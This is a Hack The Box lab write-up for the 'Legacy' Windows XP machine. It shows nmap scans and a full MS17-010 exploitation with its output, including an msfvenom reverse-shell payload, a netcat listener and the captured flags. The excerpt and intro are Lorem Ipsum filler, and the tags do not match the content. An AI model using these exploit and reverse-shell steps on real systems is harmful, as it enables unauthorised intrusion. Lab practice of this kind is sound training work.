---
layout: single
title: Legacy - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2019-04-14
classes: wide
header:
  teaser: /assets/images/htb-writeup-legacy/legacy_logo.png
  teaser_home_page: true
  icon: /assets/images/windows.png
categories:
  - hackthebox
  - infosec
tags:  
  - windows
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-legacy/legacy_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. [root:/git/htb]# nmap -Pn -n -sCV 10.10.10.4 --open                                                                               (master✱)
    PORT    STATE SERVICE      VERSION
    139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
    445/tcp open  microsoft-ds Windows XP microsoft-ds
    Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

    Host script results:
    |_clock-skew: mean: 5d01h01m15s, deviation: 1h24m50s, median: 5d00h01m15s
    |_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:11:0b (VMware)
    | smb-os-discovery:
    |   OS: Windows XP (Windows 2000 LAN Manager)
    |   OS CPE: cpe:/o:microsoft:windows_xp::-
    |   Computer name: legacy
    |   NetBIOS computer name: LEGACY\x00
    |   Workgroup: HTB\x00
    |_  System time: 2021-03-01T12:38:45+02:00
    | smb-security-mode:
    |   account_used: <blank>
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    |_smb2-time: Protocol negotiation failed (SMB2)


  [root:/git/htb]# nmap -p139,445 --script vuln 10.10.10.4                                                                          (master✱)
    PORT    STATE SERVICE
    139/tcp open  netbios-ssn
    445/tcp open  microsoft-ds

    Host script results:
    |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
    | smb-vuln-ms08-067:
    |   VULNERABLE:
    |   Microsoft Windows system vulnerable to remote code execution (MS08-067)
    |     State: LIKELY VULNERABLE
    |     IDs:  CVE:CVE-2008-4250
    |           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
    |           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
    |           code via a crafted RPC request that triggers the overflow during path canonicalization.
    |
    |     Disclosure date: 2008-10-23
    |     References:
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
    |_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
    |_smb-vuln-ms10-054: false
    |_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
    | smb-vuln-ms17-010:
    |   VULNERABLE:
    |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
    |     State: VULNERABLE
    |     IDs:  CVE:CVE-2017-0143
    |     Risk factor: HIGH
    |       A critical remote code execution vulnerability exists in Microsoft SMBv1
    |        servers (ms17-010).
    |
    |     Disclosure date: 2017-03-14
    |     References:
    |       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
    |       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
    |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143


2. ms17-010 is the obvious attack path here, lets exploit it.

a) Download the script 'send_and_execute.py'
b) Create your malicious payload:
    msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.10 LPORT=4488 EXITFUNC=thread -f exe -a x86 --platform windows -o ms17-010.exe

c) Execute!
    [root:/git/htb/legacy]# python send_and_execute.py 10.10.14.10 ms17-010.exe                                                       (master✱)
      Traceback (most recent call last):
        File "send_and_execute.py", line 2, in <module>
          from impacket import smb, smbconnection
      ImportError: No module named impacket

d) If you get the error like above, it's because your python2 version is to new.
  d1) uninstall pip3: sudo apt-get remove python3-pip
  d2) Get pip3 installer: curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
  d3) Install pip3: python3 get-pip.py
  d4) Get pip2 installer: curl https://bootstrap.pypa.io/2.7/get-pip.py -o get-pip.py
  d5) Install pip2: python get-pip.py
  d6) Now you can install any pip2 modules: pip install impacket
  d7) Make sure your python and python-pip are compatible. Python version 2.7.18 and pip 20.3.4 is preffered.

    [root:/git/htb/legacy]# python -m pip -V                                                                                          (master✱)
      pip 20.3.4 from /usr/local/lib/python2.7/dist-packages/pip (python 2.7)

    [root:/git/htb/legacy]# python -V                                                                                                 (master✱)
      Python 2.7.18

e) EXECUTE EXPLOIT AGAIN!
    [root:/git/htb/legacy]# python send_and_execute.py 10.10.10.4 ms17-010.exe                                                        (master✱)
      Trying to connect to 10.10.10.4:445
      Traceback (most recent call last):
        File "send_and_execute.py", line 1077, in <module>
          exploit(target, port, pipe_name)
        File "send_and_execute.py", line 794, in exploit
          conn = MYSMB(target, port)
        File "/git/htb/legacy/mysmb.py", line 118, in __init__
          smb.SMB.__init__(self, remote_host, remote_host, timeout=timeout)
        File "/usr/local/lib/python2.7/dist-packages/impacket/smb.py", line 2434, in __init__
          self._sess = nmb.NetBIOSTCPSession(my_name, remote_name, remote_host, host_type, sess_port, self.__timeout)
        File "/usr/local/lib/python2.7/dist-packages/impacket/nmb.py", line 893, in __init__
          timeout=timeout, local_type=local_type, sock=sock)
        File "/usr/local/lib/python2.7/dist-packages/impacket/nmb.py", line 752, in __init__
          self._sock = self._setup_connection((remote_host, sess_port), timeout)
        File "/usr/local/lib/python2.7/dist-packages/impacket/nmb.py", line 904, in _setup_connection
          raise socket.error("Connection error (%s:%s)" % (peer[0], peer[1]), e)
      socket.error: [Errno Connection error (10.10.10.4:445)] timed out

f) If above happens, reboot the box and execute a third time.
    [root:/git/htb/legacy]# python send_and_execute.py 10.10.10.4 ms17-010.exe                                                        (master✱)
      Trying to connect to 10.10.10.4:445
      Target OS: Windows 5.1
      Using named pipe: browser
      Groom packets
      attempt controlling next transaction on x86
      success controlling one transaction
      modify parameter count to 0xffffffff to be able to write backward
      leak next transaction
      CONNECTION: 0x82208430
      SESSION: 0xe1a57430
      FLINK: 0x7bd48
      InData: 0x7ae28
      MID: 0xa
      TRANS1: 0x78b50
      TRANS2: 0x7ac90
      modify transaction struct for arbitrary read/write
      make this SMB session to be SYSTEM
      current TOKEN addr: 0xe2116d30
      userAndGroupCount: 0x3
      userAndGroupsAddr: 0xe2116dd0
      overwriting token UserAndGroups
      Sending file KCC2VY.exe...
      Opening SVCManager on 10.10.10.4.....
      Creating service vteS.....
      Starting service vteS.....
      The NETBIOS connection with the remote host timed out.
      Removing service vteS.....
      ServiceExec Error on: 10.10.10.4
      nca_s_proto_error
      Done

    [root:/opt/impacket]# nc -lvnp 4488                                                                                                (master)
      listening on [any] 4488 ...
      connect to [10.10.14.10] from (UNKNOWN) [10.10.10.4] 1031
      Microsoft Windows XP [Version 5.1.2600]
      (C) Copyright 1985-2001 Microsoft Corp.

      C:\WINDOWS\system32>

      C:\Documents and Settings\john\Desktop>type user.txt
        e69af0e4f443de7e36876fda4ec7644f

      C:\Documents and Settings\Administrator\Desktop>type root.txt
        993442d258b0e0ec917cae9e695d5713


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. -

██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

send_and_execute.py
  https://github.com/helviojunior/MS17-010

mysmb.py
  https://github.com/worawit/MS17-010/blob/master/mysmb.py

no module named impacket fix:
  https://webcache.googleusercontent.com/search?q=cache:w_5LbLWkSMwJ:https://stackoverflow.com/questions/66087250/fix-for-kali-impacket-issues-between-python-2-and-3-2020-4+&cd=4&hl=sv&ct=clnk&gl=se
